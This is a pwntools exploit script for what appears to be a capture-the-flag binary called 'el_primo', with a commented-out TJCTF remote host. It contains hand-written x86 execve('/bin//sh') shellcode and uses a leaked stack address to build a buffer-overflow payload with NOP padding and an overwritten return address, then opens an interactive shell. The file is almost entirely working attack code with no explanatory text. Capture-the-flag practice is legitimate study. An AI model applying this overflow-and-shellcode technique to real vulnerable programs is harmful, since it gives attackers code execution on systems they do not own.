from pwn import *

context.arch = 'i386'
def exploit():
    p = process("./el_primo")
    # p = remote("p1.tjctf.org", 8011)

    shellcode = asm("""
                xor eax,eax
                push eax
                push 0x68732f2f
                push 0x6e69622f
                mov ebx,esp
                push eax
                push ebx
                mov ecx, esp
                mov al,0x0b
                int 0x80
                """)
    
    p.recvuntil(": ")
    var = int(p.recvline(), 16)
    log.info("Leak stack: {}".format(hex(var)))
    log.info("Shellcode length: {}".format(len(shellcode)))

    payload = ''
    payload += p32(var + 4)
    payload += shellcode
    payload += '\x90' * (32 - len(payload))
    payload += p32(var + 4)
    
    # gdb.attach(p)
    p.sendline(payload)

    p.interactive()

if __name__ == "__main__":
    exploit()